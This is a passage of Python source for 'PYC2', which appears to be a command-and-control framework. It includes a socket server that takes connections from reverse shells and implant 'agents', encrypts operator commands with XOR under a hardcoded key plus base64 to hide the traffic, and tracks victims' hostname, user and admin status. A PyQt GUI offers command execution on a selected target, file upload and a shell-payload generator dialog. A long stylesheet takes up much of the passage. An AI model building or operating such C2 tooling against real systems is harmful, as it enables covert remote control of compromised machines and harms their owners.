                            self.clients[client_id]['agent_info']['agent_type'] = 'plain_agent'
                        
                    except Exception as parse_error:
                        # Not a structured agent, treat as basic shell
                        self.clients[client_id]['info'] = {
                            'hostname': 'Unknown',
                            'username': 'Unknown', 
                            'raw_response': response[:100] + "..." if len(response) > 100 else response
                        }
                        self.clients[client_id]['agent_info']['agent_type'] = 'basic_shell'
                        self.log(f"⚠️  Basic Shell {client_id} connected - treating as plain text")
                        if self.debug_mode:
                            self.log(f"🐛 DEBUG - Parse error: {parse_error}")
                            self.log(f"🐛 DEBUG - Response preview: {response[:200]}")
                    
                    if self.client_update_signal:
                        self.client_update_signal.emit()
                        
            except Exception as e:
                self.log(f"❌ Error processing initial data from client {client_id}: {e}")
                # Continue anyway, might be a delayed connection
            
            # Keep connection alive and handle command responses
            while self.running and client_id in self.clients:
                try:
                    client_socket.settimeout(30)
                    
                    # Check for incoming data
                    ready = select.select([client_socket], [], [], 1)
                    if ready[0]:
                        data = client_socket.recv(8192)
                        if not data:
                            break
                            
                        try:
                            # Process incoming data (command responses)
                            response_text = data.decode('utf-8').strip()
                            if response_text:
                                # Check agent type and handle accordingly
                                agent_info = self.clients[client_id].get('agent_info', {})
                                
                                if self.debug_mode:
                                    self.log(f"🐛 DEBUG - Received data from agent {client_id}")
                                    self.log(f"🐛 DEBUG - Agent type: {agent_info.get('agent_type', 'unknown')}")
                                    self.log(f"🐛 DEBUG - Response length: {len(response_text)}")
                                    self.log(f"🐛 DEBUG - Response (first 100 chars): {response_text[:100]}")
                                
                                # Try to detect if this is encrypted data based on content
                                is_likely_encrypted = (
                                    len(response_text) > 50 and
                                    response_text.replace('+', '').replace('/', '').replace('=', '').isalnum() and
                                    not any(char in response_text.lower() for char in [' ', 'volume', 'directory', 'file', 'bytes', 'microsoft', 'windows'])
                                )
                                
                                if self.debug_mode:
                                    self.log(f"🐛 DEBUG - Is likely encrypted: {is_likely_encrypted}")
                                
                                # Try decryption if it looks like encrypted data or for known encrypted agents
                                if (is_likely_encrypted or 
                                    agent_info.get('agent_type') == 'c2py_advanced_agent' or
                                    agent_info.get('agent_type') == 'enhanced_windows_agent'):
                                    try:
                                        # For encrypted data: base64 decode then XOR decrypt
                                        decoded_data = base64.b64decode(response_text)
                                        
                                        if self.debug_mode:
                                            self.log(f"🐛 DEBUG - Base64 decoded data length: {len(decoded_data)}")
                                        
                                        # XOR decrypt the decoded data
                                        decrypted_bytes = xor_encrypt_decrypt(decoded_data, "SecureKey2024!!!")
                                        
                                        # Convert bytes to string
                                        final_response = decrypted_bytes.decode('utf-8', errors='replace')
                                        
                                        if self.debug_mode:
                                            self.log(f"🐛 DEBUG - Decrypted response length: {len(final_response)}")
                                            self.log(f"🐛 DEBUG - Successfully decrypted response: {final_response[:200]}")
                                        
                                        # Update agent type if successful decryption
                                        if final_response and len(final_response) > 5 and final_response != response_text:
                                            # Ensure agent_info exists before updating
                                            if 'agent_info' not in self.clients[client_id]:
                                                self.clients[client_id]['agent_info'] = {
                                                    'agent_type': 'unknown',
                                                    'encryption': 'none'
                                                }
                                            self.clients[client_id]['agent_info']['agent_type'] = 'c2py_advanced_agent'
                                            self.clients[client_id]['agent_info']['encryption'] = 'xor_encrypted'
                                            self.log(f"✅ Updated agent {client_id} type to c2py_advanced_agent")
                                            
                                    except Exception as decrypt_error:
                                        # If decryption fails, try to show readable content
                                        try:
                                            # Try direct decode without decryption (for debugging)
                                            decoded_test = base64.b64decode(response_text).decode('utf-8', errors='replace')
                                            final_response = f"[Decryption Error: {decrypt_error}]\n\nTrying direct decode:\n{decoded_test}"
                                        except:
                                            final_response = f"[Decryption Error: {decrypt_error}]\n\nRaw base64: {response_text[:200]}..."
                                        
                                        self.log(f"❌ Decryption error for agent {client_id}: {decrypt_error}")
                                        if self.debug_mode:
                                            self.log(f"🐛 DEBUG - Failed to decrypt response from {client_id}")
                                            self.log(f"🐛 DEBUG - Error details: {str(decrypt_error)}")
                                elif agent_info.get('agent_type') == 'plain_agent':
                                    # Plain JSON agent - no encryption
                                    final_response = response_text
                                    if self.debug_mode:
                                        self.log(f"🐛 DEBUG - Processing plain agent response")
                                else:
                                    # Basic shell or unknown - plain text
                                    final_response = response_text
                                    if self.debug_mode:
                                        self.log(f"🐛 DEBUG - Processing as basic shell response")
                                
                                # Send response back to GUI
                                if self.command_response_signal:
                                    self.command_response_signal.emit(client_id, final_response)
                        except Exception as e:
                            self.log(f"❌ Error processing data from agent {client_id}: {e}")
                            # Send raw response if processing fails
                            if self.command_response_signal:
                                self.command_response_signal.emit(client_id, f"[Processing Error: {e}]\nRaw: {data.decode('utf-8', errors='ignore')}")
                    
                    self.clients[client_id]['last_seen'] = datetime.now()
                    
                except socket.timeout:
                    continue
                except socket.error:
                    break
                except Exception as e:
                    self.log(f"Error handling client {client_id}: {e}")
                    break
                    
        except Exception as e:
            self.log(f"Client handler error for {client_id}: {e}")
        finally:
            self.cleanup_client(client_id)

    def send_command(self, client_id, command):
        if client_id not in self.clients:
            return "Client not found"
        
        try:
            client_socket = self.clients[client_id]['socket']
            
            # Add command to history
            cmd_type = "advanced" if command.startswith('{') else "shell"
            self.add_command_to_history(client_id, command, cmd_type)
            
            # Check if this is an encrypted agent or if we should try encryption
            agent_info = self.clients[client_id].get('agent_info', {})
            
            if self.debug_mode:
                self.log(f"🐛 DEBUG - Sending command to agent {client_id}")
                self.log(f"🐛 DEBUG - Agent type: {agent_info.get('agent_type', 'unknown')}")
                self.log(f"🐛 DEBUG - Command: {command}")
                self.log(f"🐛 DEBUG - Command type: {cmd_type}")
            
            # Improved command encoding logic
            if (agent_info.get('agent_type') == 'c2py_advanced_agent' or 
                agent_info.get('agent_type') == 'enhanced_windows_agent' or
                agent_info.get('encryption') == 'xor_encrypted'):
                # For encrypted agents: XOR encrypt then base64 encode
                try:
                    encrypted_bytes = xor_encrypt_decrypt(command, "SecureKey2024!!!")
                    encoded_command = base64.b64encode(encrypted_bytes).decode('utf-8')
                    
                    if self.debug_mode:
                        self.log(f"🐛 DEBUG - Original command: {command}")
                        self.log(f"🐛 DEBUG - Encrypted bytes length: {len(encrypted_bytes)}")
                        self.log(f"🐛 DEBUG - Encoded command: {encoded_command[:50]}...")
                        self.log(f"🐛 DEBUG - Sending encrypted command")
                    
                    client_socket.send((encoded_command + '\n').encode('utf-8'))
                except Exception as encrypt_error:
                    if self.debug_mode:
                        self.log(f"🐛 DEBUG - Encryption failed: {encrypt_error}")
                    # Fall back to plain text
                    client_socket.send((command + '\n').encode('utf-8'))
                    
            elif agent_info.get('agent_type') == 'plain_agent':
                # For plain JSON agents: send as is
                if self.debug_mode:
                    self.log(f"🐛 DEBUG - Sending plain command to JSON agent")
                client_socket.send((command + '\n').encode('utf-8'))
            else:
                # For basic shells or unknown: send plain text by default
                if self.debug_mode:
                    self.log(f"🐛 DEBUG - Sending plain command to basic shell")
                client_socket.send((command + '\n').encode('utf-8'))
            
            self.log(f"Command sent to agent {client_id}: {command}")
            return "Command sent successfully"
            
        except Exception as e:
            self.log(f"Error sending command to client {client_id}: {e}")
            return f"Error: {e}"

    def cleanup_client(self, client_id):
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
            del self.clients[client_id]
            self.log(f"Agent {client_id} disconnected")
            
            if self.client_update_signal:
                self.client_update_signal.emit()

    def stop_server(self):
        self.running = False
        
        # Close all client connections
        for client_id in list(self.clients.keys()):
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
        
        # Close server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        if self.log_signal:
            self.log_signal.emit("[*] Enhanced C2 Server stopped")

class ServerThread(QThread):
    """Worker thread to run the C2 server without blocking the GUI"""
    log_message = pyqtSignal(str)
    client_update = pyqtSignal()
    command_response = pyqtSignal(int, str)

    def __init__(self, host, port):
        super().__init__()
        self.server = EnhancedC2Server(host=host, port=port)
        self.server.log_signal = self.log_message
        self.server.client_update_signal = self.client_update
        self.server.command_response_signal = self.command_response
        self._stop_requested = False

    def run(self):
        self.server.start_listener()

    def stop(self):
        self._stop_requested = True
        self.server.stop_server()
        self.quit()
        self.wait(3000)  # Wait max 3 seconds for thread to finish
        
    def __del__(self):
        if self.isRunning():
            self.stop()

class C2Gui(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("PYC2 // Professional Command & Control Framework")
        self.setGeometry(100, 100, 1600, 1000)
        
        # Set window icon with fallback
        try:
            icon = IconSystem.get_icon('computer', IconSystem.COLORS['primary'], 32)
            if icon and not icon.isNull():
                self.setWindowIcon(icon)
            else:
                # Fallback to file-based icon
                import os
                icon_paths = ["icon.png", "logo.png", os.path.join(os.path.dirname(__file__), "icon.png")]
                for icon_path in icon_paths:
                    if os.path.exists(icon_path):
                        pixmap = QPixmap(icon_path)
                        if not pixmap.isNull():
                            self.setWindowIcon(QIcon(pixmap))
                            break
        except Exception as e:
            # If all else fails, use default system icon
            pass
        
        # Design restored from screenshots - Sharp edges, compact buttons, traditional dark theme
        self.setStyleSheet("""
            /* === Main Window & Typography === */
            QMainWindow, QWidget {
                background-color: #1e1e1e; /* Dark background like in screenshots */
                color: #d4d4d4; /* Light text */
                font-family: 'Segoe UI', 'SF Pro Display', 'Roboto', sans-serif;
                font-size: 11px;
            }
            
            /* === Panels & Frames === */
            QFrame#mainPanel {
                background-color: #252526; /* Panel background from screenshots */
                border: 1px solid #3e3e42;
                margin: 2px;
            }
            
            /* === Header & Footer === */
            QFrame#headerFrame, QFrame#footerFrame {
                background-color: #2d2d30;
                border: none;
            }
            QFrame#headerFrame { border-bottom: 1px solid #3e3e42; }
            QFrame#footerFrame { border-top: 1px solid #3e3e42; }

            /* === Input Fields - Sharp Edges as in Screenshots === */
            QLineEdit, QComboBox {
                background-color: #3c3c3c;
                border: 1px solid #5e5e5e;
                border-radius: 0px; /* Sharp edges like screenshots */
                padding: 8px 12px; /* Smaller padding like screenshots */
                color: #d4d4d4;
                font-size: 12px;
                selection-background-color: #264f78;
                min-height: 16px;
            }
            QLineEdit:focus, QComboBox:focus {
                border-color: #007acc;
                background-color: #2a2a2a;
            }
            QLineEdit:hover, QComboBox:hover {
                background-color: #404040;
                border-color: #007acc;
            }
            
            /* Dropdown Styling */
            QComboBox::drop-down { 
                border: none; 
                width: 20px;
                background-color: #3c3c3c;
            }
            QComboBox::down-arrow {
                image: none;
                border: 3px solid transparent;
                border-top: 5px solid #d4d4d4;
                margin-right: 6px;
            }
            QComboBox QAbstractItemView {
                background-color: #2d2d30;
                border: 1px solid #007acc;
                border-radius: 0px;
                color: #d4d4d4;
                selection-background-color: #007acc;
                outline: none;
            }

            /* === Terminal Areas - Black Background === */
            QTextBrowser, QTextEdit {
                background-color: #000000; /* Pure black terminal like screenshots */
                border: 1px solid #3e3e42;
                border-radius: 0px; /* Sharp edges */
                color: #ffffff;
                selection-background-color: #264f78;
                font-family: 'Consolas', 'SF Mono', 'Monaco', monospace;
                font-size: 11px;
                padding: 8px;
                line-height: 1.3;
            }
            QTextBrowser#log_browser {
                background-color: #000000;
                color: #00ff00; /* Green text for logs like screenshots */
            }
            
            /* === Compact Sharp Buttons like Screenshots === */
            QPushButton {
                background-color: #0e639c;
                border: 1px solid #0e639c;
                border-radius: 0px; /* Sharp rectangular buttons like screenshots */
                padding: 6px 16px; /* Smaller padding like screenshots */
                color: #ffffff;
                font-weight: 500;
                font-size: 11px;
                min-height: 12px; /* Smaller height like screenshots */
                min-width: 60px; /* Smaller width like screenshots */
            }
            QPushButton:hover {
                background-color: #1177bb;
                border-color: #1177bb;
            }
            QPushButton:pressed {
                background-color: #005a9e;
                border-color: #005a9e;
            }
            QPushButton:disabled {
                background-color: #3e3e42;
                border-color: #3e3e42;
                color: #858585;
            }

            /* === Specialized Button Colors like Screenshots === */
            QPushButton#startButton {
                background-color: #16825d;
                border-color: #16825d;
                color: #ffffff;
            }
            QPushButton#startButton:hover {
                background-color: #1e9668;
                border-color: #1e9668;
            }
            
            QPushButton#stopButton {
                background-color: #f85149;
                border-color: #f85149;
                color: #ffffff;
            }
            QPushButton#stopButton:hover {
                background-color: #ff6b6b;
                border-color: #ff6b6b;
            }
            
            QPushButton#sendButton {
                background-color: #1f6feb;
                border-color: #1f6feb;
                color: #ffffff;
            }
            QPushButton#sendButton:hover {
                background-color: #388bfd;
                border-color: #388bfd;
            }
            
            QPushButton#payloadButton {
                background-color: #8b5cf6;
                border-color: #8b5cf6;
                color: #ffffff;
            }
            QPushButton#payloadButton:hover {
                background-color: #a78bfa;
                border-color: #a78bfa;
            }
            
            QPushButton#uploadButton {
                background-color: #6b7280;
                border-color: #6b7280;
                color: #ffffff;
            }
            QPushButton#uploadButton:hover {
                background-color: #9ca3af;
                border-color: #9ca3af;
            }

            /* === Table Design - Sharp & Traditional === */
            QTreeWidget, QTableWidget {
                background-color: #252526;
                border: 1px solid #3e3e42;
                border-radius: 0px; /* Sharp edges like screenshots */
                gridline-color: #3e3e42;
                color: #d4d4d4;
                selection-background-color: #264f78;
                font-size: 11px;
                outline: none;
            }
            QTreeWidget::item, QTableWidget::item { 
                padding: 6px 10px; /* Smaller padding like screenshots */
                border: none;
                border-bottom: 1px solid #3e3e42;
            }
            QTreeWidget::item:selected, QTableWidget::item:selected { 
                background-color: #264f78;
                color: #ffffff;
            }
            QTreeWidget::item:hover, QTableWidget::item:hover {
                background-color: #2a2a2a;
            }
            QHeaderView::section {
                background-color: #2d2d30;
                border: none;
                border-bottom: 1px solid #3e3e42;
                border-right: 1px solid #3e3e42;
                padding: 6px 10px; /* Smaller padding */
                font-size: 10px;
                font-weight: 600;
                color: #d4d4d4;
            }

            /* === Traditional Scrollbars === */
            QScrollBar:vertical { 
                background: #2d2d30; 
                width: 10px; 
                border-radius: 0px; /* Sharp scrollbars */
                margin: 0;
            }
            QScrollBar::handle:vertical { 
                background: #424242; 
                min-height: 20px; 
                border-radius: 0px;
                margin: 1px;
            }
            QScrollBar::handle:vertical:hover { 
                background: #4f4f4f;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { 
                height: 0px; 
            }
            QScrollBar:horizontal { 
                background: #2d2d30; 
                height: 10px; 
                border-radius: 0px;
                margin: 0;
            }
            QScrollBar::handle:horizontal { 
                background: #424242; 
                min-width: 20px; 
                border-radius: 0px;
                margin: 1px;
            }
            QScrollBar::handle:horizontal:hover { 
                background: #4f4f4f;
            }
            QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal { 
                width: 0px; 
            }

            /* === Traditional Splitter === */
            QSplitter::handle { 
                background-color: #3e3e42;
                border-radius: 0px; /* Sharp splitters */
            }
            QSplitter::handle:vertical { 
                height: 4px; 
                margin: 1px 0;
            }
            QSplitter::handle:horizontal { 
                width: 4px;
                margin: 0 1px;
            }
            QSplitter::handle:hover {
                background-color: #007acc;
            }
            
            /* === Traditional Labels === */
            QLabel { 
                color: #d4d4d4; 
                background: transparent;
                font-weight: 400;
            }
            QLabel#titleLabel { 
                font-size: 16px; 
                font-weight: 600; 
                color: #ffffff;
                margin-bottom: 4px;
            }
            QLabel#statusIndicatorLabel { 
                font-size: 11px; 
                font-weight: 500;
                margin-left: 12px;
            }
            QLabel#inputLabel { 
                font-size: 10px; 
                color: #858585; 
                font-weight: 500;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            QLabel#headerLabel {
                font-size: 10px; 
                font-weight: 600; 
                color: #858585;
                background: transparent; 
                border: none;
                padding: 4px 0;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }

            /* === Status Bar === */
            QStatusBar {
                background-color: #2d2d30;
                border-top: 1px solid #3e3e42;
                color: #d4d4d4;
                font-size: 10px;
                padding: 4px;
            }

            /* === Group Boxes === */
            QGroupBox {
                font-weight: 600;
                font-size: 12px;
                color: #d4d4d4;
                border: 1px solid #3e3e42;
                border-radius: 0px; /* Sharp group boxes */
                margin-top: 12px;
                padding-top: 8px;
                background-color: #252526;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px 0 8px;
                color: #ffffff;
                background-color: #252526;
                font-weight: 600;
            }

            /* === Tooltips === */
            QToolTip {
                background-color: #2d2d30;
                border: 1px solid #007acc;
                border-radius: 0px; /* Sharp tooltips */
                padding: 6px 10px; /* Smaller padding */
                color: #d4d4d4;
                font-family: 'Segoe UI', sans-serif;
                font-size: 11px;
            }

            /* === List Widgets === */
            QListWidget {
                background-color: #252526;
                border: 1px solid #3e3e42;
                border-radius: 0px;
                color: #d4d4d4;
                outline: none;
            }
            QListWidget::item {
                padding: 6px 10px; /* Smaller padding */
                border-bottom: 1px solid #3e3e42;
                border-radius: 0px;
                margin: 0px;
            }
            QListWidget::item:selected {
                background-color: #264f78;
                color: #ffffff;
            }
            QListWidget::item:hover {
                background-color: #2a2a2a;
            }

            /* === Tab Widgets === */
            QTabWidget::pane {
                border: 1px solid #3e3e42;
                border-radius: 0px;
                background-color: #252526;
                top: -1px;
            }
            QTabBar::tab {
                background-color: #2d2d30;
                border: 1px solid #3e3e42;
                padding: 6px 14px; /* Smaller padding */
                margin-right: 2px;
                border-radius: 0px; /* Sharp tabs */
                color: #d4d4d4;
            }
            QTabBar::tab:selected {
                background-color: #252526;
                border-bottom: 1px solid #252526;
                color: #ffffff;
            }
            QTabBar::tab:hover {
                background-color: #3e3e42;
            }
        """)
        
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(0)

        self.server_thread = None
        self.active_agent_id = None
        
        # The new payload generator does not need to be instantiated.
        # The dialog will handle it.
        self.payload_generator = None 

        self.init_ui()


    def init_ui(self):
        # === HEADER SECTION ===
        header_frame = QFrame()
        header_frame.setObjectName("headerFrame")
        header_frame.setFixedHeight(50)
        header_layout = QHBoxLayout(header_frame)
        header_layout.setContentsMargins(12, 8, 12, 8)
        header_layout.setSpacing(12)
        
        # Logo
        logo_label = QLabel()
        try:
            import os
            # Check both current directory and script directory
            logo_paths = ["logo.png", "icon.png", os.path.join(os.path.dirname(__file__), "logo.png"), os.path.join(os.path.dirname(__file__), "icon.png")]
            pixmap = None
            for logo_path in logo_paths:
                if os.path.exists(logo_path):
                    pixmap = QPixmap(logo_path)
                    if not pixmap.isNull():
                        break
            
            if pixmap and not pixmap.isNull():
                logo_label.setPixmap(pixmap.scaled(35, 35, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
            else:
                # Fallback to text logo if no image found
                logo_label.setText("C2PY")
                logo_label.setStyleSheet("""
                    QLabel {
                        color: #00ff41;
                        font-size: 16px;
                        font-weight: bold;
                        border: 2px solid #00ff41;
                        border-radius: 18px;
                        padding: 4px 8px;
                        background: qlineargradient(x1:0, y1:0, x2:1, y2:1, 
                            stop:0 #1a1a1a, stop:1 #2d2d2d);
                    }
                """)
        except Exception as e:
            # Fallback to text logo
            logo_label.setText("C2PY")
            logo_label.setStyleSheet("""
                QLabel {
                    color: #00ff41;
                    font-size: 16px;
                    font-weight: bold;
                    border: 2px solid #00ff41;
                    border-radius: 18px;
                    padding: 4px 8px;
                    background: qlineargradient(x1:0, y1:0, x2:1, y2:1, 
                        stop:0 #1a1a1a, stop:1 #2d2d2d);
                }
            """)
        
        if not hasattr(logo_label, 'setStyleSheet') or "border: none;" in str(logo_label.styleSheet()):
            logo_label.setStyleSheet("border: none;")

        # Title and branding
        title_label = QLabel("PYC2 Framework")
        title_label.setObjectName("titleLabel")
        
        # Status indicator
        self.status_indicator = QLabel("● OFFLINE")
        self.status_indicator.setObjectName("statusIndicatorLabel")
        self.status_indicator.setStyleSheet("color: #D9534F;")
        
        # Connection inputs
        connection_layout = QHBoxLayout()
        connection_layout.setSpacing(8)
        
        lhost_label = QLabel("HOST:")
        lhost_label.setObjectName("inputLabel")
        self.lhost_input = QLineEdit("0.0.0.0")
        self.lhost_input.setFixedWidth(100)
        
        lport_label = QLabel("PORT:")
        lport_label.setObjectName("inputLabel")
        self.lport_input = QLineEdit("9999")
        self.lport_input.setFixedWidth(60)
        
        # Control buttons
        self.payload_button = QPushButton("SHELLS")
        self.payload_button.setObjectName("payloadButton")
        self.payload_button.setFixedSize(90, 28)
        self.payload_button.clicked.connect(self.open_payload_generator)

        self.start_button = QPushButton("START")
        self.start_button.setObjectName("startButton")
        self.start_button.setFixedSize(75, 28)
        
        self.stop_button = QPushButton("STOP")
        self.stop_button.setObjectName("stopButton")
        self.stop_button.setFixedSize(75, 28)
        self.stop_button.setEnabled(False)
        
        connection_layout.addWidget(lhost_label)
        connection_layout.addWidget(self.lhost_input)
        connection_layout.addWidget(lport_label)
        connection_layout.addWidget(self.lport_input)
        connection_layout.addWidget(self.payload_button)
        connection_layout.addWidget(self.start_button)
        connection_layout.addWidget(self.stop_button)
        
        header_layout.addWidget(logo_label)
        header_layout.addWidget(title_label)
        header_layout.addWidget(self.status_indicator)
        header_layout.addStretch()
        header_layout.addLayout(connection_layout)
        header_frame.setLayout(header_layout)
        
        self.main_layout.addWidget(header_frame)
        
        # === MAIN CONTENT AREA ===
        content_container = QWidget()
        content_layout = QVBoxLayout(content_container)
        content_layout.setContentsMargins(10, 10, 10, 10)
        content_layout.setSpacing(10)
        
        main_splitter = QSplitter(Qt.Orientation.Vertical)
        main_splitter.setChildrenCollapsible(False)
        
        # === TOP SECTION: Logs and Agents ===
        top_widget = QWidget()
        top_layout = QHBoxLayout(top_widget)
        top_layout.setContentsMargins(0, 0, 0, 0)
        top_layout.setSpacing(10)
        
        # Server Logs Panel
        log_frame = QFrame()
        log_frame.setObjectName("mainPanel")
        log_layout = QVBoxLayout(log_frame)
        log_layout.setContentsMargins(10, 10, 10, 10)
        log_layout.setSpacing(4)
        
        log_header = QLabel("SERVER LOGS")
        log_header.setObjectName("headerLabel")
        log_layout.addWidget(log_header)
        
        self.log_browser = QTextBrowser()
        self.log_browser.setObjectName("log_browser") # Assign object name for specific styling
        self.log_browser.setHtml('<span style="color: #888;">Server logs will appear here...</span>')
        log_layout.addWidget(self.log_browser)
        log_frame.setLayout(log_layout)
        
        # Agents Panel
        agents_frame = QFrame()
        agents_frame.setObjectName("mainPanel")
        agents_layout = QVBoxLayout(agents_frame)
        agents_layout.setContentsMargins(10, 10, 10, 10)
        agents_layout.setSpacing(4)
        
        agents_header = QLabel("CONNECTED AGENTS")
        agents_header.setObjectName("headerLabel")
        agents_layout.addWidget(agents_header)
        
        self.client_table = QTableWidget()
        self.client_table.setColumnCount(7)
        self.client_table.setHorizontalHeaderLabels(['ID', 'ADDRESS', 'HOSTNAME', 'USER', 'ADMIN', 'STATUS', 'LAST SEEN'])
        self.client_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.client_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.client_table.setAlternatingRowColors(False) # Let stylesheet handle colors
        self.client_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.client_table.customContextMenuRequested.connect(self.show_agent_context_menu)
        agents_layout.addWidget(self.client_table)
        agents_frame.setLayout(agents_layout)
        
        top_layout.addWidget(log_frame, 1)
        top_layout.addWidget(agents_frame, 2)
        top_widget.setLayout(top_layout)
        
        # === BOTTOM SECTION: Command Interface ===
        bottom_widget = QWidget()
        bottom_layout = QVBoxLayout(bottom_widget)
        bottom_layout.setContentsMargins(0, 0, 0, 0)
        bottom_layout.setSpacing(10)
        
        # Command Input Panel
        command_frame = QFrame()
        command_frame.setObjectName("mainPanel")
        command_layout = QHBoxLayout(command_frame)
        command_layout.setContentsMargins(10, 10, 10, 10)
        command_layout.setSpacing(8)
        
        agent_label = QLabel("TARGET:")
        agent_label.setObjectName("inputLabel")
        
        self.agent_selector = QComboBox()
        self.agent_selector.setFixedWidth(150)
        
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Enter command to execute...")
        
        # Action buttons
        self.send_button = QPushButton("SEND")
        self.send_button.setObjectName("sendButton")
        self.send_button.setFixedSize(60, 28)
        
        self.upload_button = QPushButton("UPLOAD")
        self.upload_button.setObjectName("uploadButton")
        self.upload_button.setFixedSize(70, 28)
        
        command_layout.addWidget(agent_label)
        command_layout.addWidget(self.agent_selector)
        command_layout.addWidget(self.command_input)
        command_layout.addWidget(self.send_button)
        command_layout.addWidget(self.upload_button)
        command_frame.setLayout(command_layout)
        
        bottom_layout.addWidget(command_frame)
        
        # Command Output
        output_frame = QFrame()
        output_frame.setObjectName("mainPanel")
        output_layout = QVBoxLayout(output_frame)
        output_layout.setContentsMargins(10, 10, 10, 10)
        output_layout.setSpacing(4)
        
        output_header = QLabel("COMMAND OUTPUT")
        output_header.setObjectName("headerLabel")
        output_layout.addWidget(output_header)
        
        self.output_browser = QTextBrowser()
        self.output_browser.setHtml('<span style="color: #888;">Command output will appear here...</span>')
        output_layout.addWidget(self.output_browser)
        output_frame.setLayout(output_layout)
        
        bottom_layout.addWidget(output_frame)
        bottom_widget.setLayout(bottom_layout)
        
        main_splitter.addWidget(top_widget)
        main_splitter.addWidget(bottom_widget)
        main_splitter.setSizes([300, 350])
        
        content_layout.addWidget(main_splitter)
        content_container.setLayout(content_layout)
        self.main_layout.addWidget(content_container)
        
        # === STATUS BAR ===
        status_frame = QFrame()
        status_frame.setObjectName("footerFrame")
        status_frame.setFixedHeight(25)
        status_layout = QHBoxLayout(status_frame)
        status_layout.setContentsMargins(8, 4, 8, 4)
        
        self.connection_status = QLabel("Disconnected")
        self.connection_status.setStyleSheet("font-size: 9px; color: #888; background: transparent;")
        
        self.agent_count = QLabel("Agents: 0")
        self.agent_count.setStyleSheet("font-size: 9px; color: #888; background: transparent;")
        
        status_layout.addWidget(self.connection_status)
        status_layout.addStretch()
        status_layout.addWidget(self.agent_count)
        status_frame.setLayout(status_layout)
        
        self.main_layout.addWidget(status_frame)

        # Connect signals
        self.start_button.clicked.connect(self.start_server)
        self.stop_button.clicked.connect(self.stop_server)
        self.send_button.clicked.connect(self.send_command)
        self.command_input.returnPressed.connect(self.send_command)
        self.client_table.itemSelectionChanged.connect(self.update_active_agent)
        self.upload_button.clicked.connect(self.upload_file_to_agent)
        
        # Apply icons strategically without breaking design
        self._integrate_icons()

    def _integrate_icons(self):
        """Strategically integrate icons without changing existing design"""
        try:
            # Add icons to main buttons (subtle size to not break layout)
            icon_size = 16
            
            # Main control buttons
            self.start_button.setIcon(IconSystem.get_icon('play', IconSystem.COLORS['success'], icon_size))
            self.stop_button.setIcon(IconSystem.get_icon('stop', IconSystem.COLORS['error'], icon_size))
            self.send_button.setIcon(IconSystem.get_icon('send', IconSystem.COLORS['primary'], icon_size))
            self.upload_button.setIcon(IconSystem.get_icon('upload', IconSystem.COLORS['warning'], icon_size))
            self.payload_button.setIcon(IconSystem.get_icon('terminal', IconSystem.COLORS['primary'], icon_size))
            
            # Set small icon sizes to preserve button design
            self.start_button.setIconSize(QSize(icon_size, icon_size))
            self.stop_button.setIconSize(QSize(icon_size, icon_size))
            self.send_button.setIconSize(QSize(icon_size, icon_size))
            self.upload_button.setIconSize(QSize(icon_size, icon_size))
            self.payload_button.setIconSize(QSize(icon_size, icon_size))
            
        except Exception as e:
            # Silently fail if icons can't be loaded - don't break functionality
            pass

    def update_active_agent(self):
        """Sets the active agent based on table selection."""
        selected_items = self.client_table.selectedItems()
        if not selected_items:
            self.active_agent_id = None
            return
        
        selected_row = selected_items[0].row()
        try:
            client_id = int(self.client_table.item(selected_row, 0).text())
            self.active_agent_id = client_id
            
            # Find the corresponding item in the combobox and set it
            index = self.agent_selector.findData(client_id)
            if index != -1:
                self.agent_selector.setCurrentIndex(index)
            
            self.log_message(f"Active agent set to ID: {client_id}")
        except (ValueError, AttributeError):
            self.active_agent_id = None
            self.log_message("Could not determine active agent from selection.")

    def upload_file_to_agent(self):
        if not self.active_agent_id:
            self.log_message('<span style="color: #D9534F;">Cannot upload: No agent selected.</span>')
            return

        file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if not file_path:
            return

        if self.server_thread:
            self.log_message(f"Uploading {Path(file_path).name} to agent {self.active_agent_id}...")
            QApplication.processEvents()
            try:
                # This is a simplified placeholder. A real implementation needs a method in the server.
                # For now, we'll just log it. The server/agent protocol needs to be extended for this.
                self.log_message(f'<span style="color: #F0AD4E;">File upload functionality is not fully implemented in the agent protocol.</span>')
                # In a real scenario, you would have something like:
                # self.server_thread.server.upload_file(self.active_agent_id, file_path)
            except Exception as e:
                self.log_message(f'<span style="color: #D9534F;">File upload failed: {e}</span>')

    def open_payload_generator(self):
        lhost = self.lhost_input.text()
        lport = self.lport_input.text()
        
        dialog = PayloadDialog(self, lhost=lhost, lport=lport)
        
        # Automatisch C2PY Agents auswählen wenn verfügbar
        if dialog.generator:
            categories = dialog.generator.get_categories()
            if "C2PY Agents" in categories:
                index = categories.index("C2PY Agents")
                dialog.category_combo.setCurrentIndex(index)
                # Trigger category change to load subcategories
                dialog.on_category_changed()
        
        dialog.exec()

    def start_server(self):
        lhost = self.lhost_input.text()
        port = int(self.lport_input.text())
        
        self.server_thread = ServerThread(lhost, port)
        self.server_thread.log_message.connect(self.log_message)
        self.server_thread.client_update.connect(self.update_client_table)
        self.server_thread.command_response.connect(self.handle_command_response)
        
        self.server_thread.start()

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.lhost_input.setEnabled(False)
        self.lport_input.setEnabled(False)
        self.status_indicator.setText("● ONLINE")
        self.status_indicator.setStyleSheet("color: #4CAF50;")
        self.connection_status.setText(f"Listening on {lhost}:{port}")
        self.log_message(f"Enhanced C2 Server listening on {lhost}:{port}")

    def start_listener(self, lhost=None, lport=None):
